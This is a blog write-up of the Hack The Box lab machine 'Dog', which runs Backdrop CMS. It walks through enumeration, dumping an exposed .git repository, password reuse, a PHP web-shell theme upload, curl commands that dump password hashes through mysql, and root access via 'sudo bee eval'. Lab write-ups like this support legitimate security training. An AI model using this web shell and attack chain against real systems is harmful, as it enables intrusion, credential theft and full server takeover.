---
layout: post
title: 'Hack The Box - Machine Write-Up: Dog'
created-at: 2025-05-02
categories: ["Hack The Box", "WriteUp", "Cybersecurity"]
image: /docs/assets/2025-05/htb-dog-0.png
---

## Enumeration and Analysis

> nmap 10.10.11.58

```                                                                                 
> nmap -p22,80 -sCV 10.10.11.58  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-02 01:01 EDT
Nmap scan report for 10.10.11.58
Host is up (0.024s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-title: Home | Dog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
```

The target here seems to be a blog about dog care:
![Landing Page](/docs/assets/2025-05/htb-dog-1.png)

Nmap already revealed some good info about the target, specifically the existence of a `robots.txt` and a git repository:

```
User-agent: *
Crawl-delay: 10
# Directories
Disallow: /core/
Disallow: /profiles/
# Files
Disallow: /README.md
Disallow: /web.config
# Paths (clean URLs)
Disallow: /admin
Disallow: /comment/reply
Disallow: /filter/tips
Disallow: /node/add
Disallow: /search
Disallow: /user/register
Disallow: /user/password
Disallow: /user/login
Disallow: /user/logout
# Paths (no clean URLs)
Disallow: /?q=admin
Disallow: /?q=comment/reply
Disallow: /?q=filter/tips
Disallow: /?q=node/add
Disallow: /?q=search
Disallow: /?q=user/password
Disallow: /?q=user/register
Disallow: /?q=user/login
Disallow: /?q=user/logout
```

I then used `ZAP` to crawl and scan the website. It found a directory browsing misconfiguration on Apache that allows access to all files on the directory.

It also identified the existence of a `.git` directory, which I used `wget` to retrieve all the contents of the web directory:

```console
 > wget -r http://10.10.11.58/.git/
 ```

Since the git history contains the historical changes of the files, it identifies me not having the files on my system as being deleted. I can then see the contents of these files on a git change-log, and even revert those changes to recreate these files on my machine.

I can now see the contents of the `settings.php` file:

```php
<?php
...
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
...
$config_directories['active'] = './files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active';
$config_directories['staging'] = './files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/staging';
...
$settings['update_free_access'] = FALSE;
...
$settings['hash_salt'] = 'aWFvPQNGZSz1DQ701dD4lC5v1hQW34NefHvyZUzlThQ';
...
$settings['backdrop_drupal_compatibility'] = TRUE;
...
```

Here I can see the database credentials that are being used by the system.

---

After combing through the code and attempt different methods of logging in into the website, I decided to look up another writeup. I found [this](https://samarthdad.com/posts/hackthebox-dog/) really good post by [@samarthdad](https://samarthdad.com/) that outlines something that I missed.

Looking up the retrieved code base for emails, we can find two extra references outside the pre-known user: `root@dog.htb` and `tiffany@dog.htb`.

---

Checking for password reuse with the known database password, I was able to successfully login as `tiffany`:

![Logged-in](/docs/assets/2025-05/htb-dog-2.png)

From there I saw that there was a option to upload a theme. So I followed the documentation and created a new theme, where the `template.php` has a web shell.

The template has to be packed into a `.tar` file, and needs a mandatory `.info` that contains specifications for the template.

The `.info` file contains:
```
name = <template name>
type = theme
version = 1.1
backdrop = 1.x
```

And `template.php` contains:
```php
<?php system($_REQUEST['cmd']); ?>
```

After installing it to the website, I can just navigate to `http://10.10.11.58/themes/<template name>/template.php` and use the web-shell to execute commands on the machine:

```
> curl 10.10.11.58/themes/<template name>/template.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Looking at the machine directories, we can see two users:

```
> curl '10.10.11.58/themes/<template name>/template.php?cmd=ls%20../../../../../home/'
jobert
johncusack
```

And we can see that the user flag can be seen inside the home directory of `johncusack`:

```
> curl '10.10.11.58/themes/<template name>/template.php?cmd=ls%20../../../../../home/johncusack'
user.txt
```

---

I then used the known database password to extract user information:

```
# mysql -h 127.0.0.1 -u root -pBackDropJ2024DS2024 -D backdrop -e 'SHOW TABLES;'
> curl '10.10.11.58/themes/<template name>/template.php?cmd=mysql%20-h%20127.0.0.1%20-u%20root%20-pBackDropJ2024DS2024%20-D%20backdrop%20-e%20%27SHOW%20TABLES%3B%27'
Tables_in_backdrop
batch
cache
cache_admin_bar
cache_bootstrap
cache_entity_comment
cache_entity_file
cache_entity_node
cache_entity_taxonomy_term
cache_entity_user
cache_field
cache_filter
cache_layout_path
cache_menu
cache_page
cache_path
cache_token
cache_update
cache_views
cache_views_data
comment
field_data_body
field_data_comment_body
field_data_field_image
field_data_field_tags
field_revision_body
field_revision_comment_body
field_revision_field_image
field_revision_field_tags
file_managed
file_metadata
file_usage
flood
history
menu_links
menu_router
node
node_access
node_comment_statistics
node_revision
queue
redirect
search_dataset
search_index
search_node_links
search_total
semaphore
sequences
sessions
state
system
taxonomy_index
taxonomy_term_data
taxonomy_term_hierarchy
tempstore
url_alias
users
users_roles
variable
watchdog
```

```
# mysql -h 127.0.0.1 -u root -pBackDropJ2024DS2024 -D backdrop -e 'SELECT name, pass FROM users;'
> curl '10.10.11.58/themes/<template name>/template.php?cmd=mysql%20-h%20127.0.0.1%20-u%20root%20-pBackDropJ2024DS2024%20-D%20backdrop%20-e%20%27SELECT%20name%2C%20pass%20FROM%20users%3B%27'                     
name                pass

jPAdminB            $S$E7dig1GTaGJnzgAXAtOoPuaTjJ05fo8fH9USc6vO87T./ffdEr/.
jobert              $S$E/F9mVPgX4.dGDeDuKxPdXEONCzSvGpjxUeMALZ2IjBrve9Rcoz1
dogBackDropSystem   $S$EfD1gJoRtn8I5TlqPTuTfHRBFQWL3x6vC5D3Ew9iU4RECrNuPPdD
john                $S$EYniSfxXt8z3gJ7pfhP5iIncFfCKz8EIkjUD66n/OTdQBFklAji.
morris              $S$E8OFpwBUqy/xCmMXMqFp3vyz1dJBifxgwNRMKktogL7VVk7yuulS
axel                $S$E/DHqfjBWPDLnkOP5auHhHDxF4U.sAJWiODjaumzxQYME6jeo9qV
rosa                $S$EsV26QVPbF.s0UndNPeNCxYEP/0z2O.2eLUNdKW/xYhg2.lsEcDT
tiffany             $S$EEAGFzd8HSQ/IzwpqI79aJgRvqZnH4JSKLv2C83wUphw0nuoTY8v                                                            
```

From here, I tried using `hashcat` to crack the password, but didn't have much success.

---

I tried different strategies on the machine, but not much success. So double checked the writeup from [@samarthdad](https://samarthdad.com/) again, and it was just a simple password reuse from `johncusack`, same password as `tiffany`...

On `/home/johncusack/user.txt` we can find the user flag.

## Privilege escalation

Checking for commands that are allowed as `sudo`, it seems that one utility CLI from backdrop is allowed.

```
johncusack@dog:~$ sudo -l
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

```
johncusack@dog:~$ sudo bee help
🐝 Bee
Usage: bee [global-options] <command> [options] [arguments]

Global Options:
 --root
 Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.

...

 ADVANCED
  db-query
   dbq
   Execute a query using db_query().

  eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.

  php-script
   scr
   Execute an arbitrary PHP file after bootstrapping Backdrop.

  sql
   sqlc, sql-cli, db-cli
   Open an SQL command-line interface using Backdrop's database credentials.
```

Checking on how the `eval` option works:

```
johncusack@dog:~$ sudo bee --root=/var/www/html eval "echo '1';"
1
```

Seems like I have sudo command execution 😁. And thus, root flag:

```
johncusack@dog:~$ sudo bee --root=/var/www/html eval "system('cat /root/root.txt');"
<admin flag>
```